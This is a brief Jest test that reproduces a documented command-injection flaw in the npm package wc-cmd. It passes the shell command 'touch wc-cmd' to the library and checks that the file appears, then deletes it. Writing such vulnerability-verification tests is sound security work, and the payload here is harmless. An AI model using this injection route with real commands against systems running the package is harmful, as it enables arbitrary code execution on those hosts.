//https://snyk.io/vuln/SNYK-JS-WCCMD-1050423
test("Command Injection in wc-cmd", () => {
  const a = require("wc-cmd");
  const fs = require("fs");
  const path = "./wc-cmd";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  a("touch wc-cmd");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
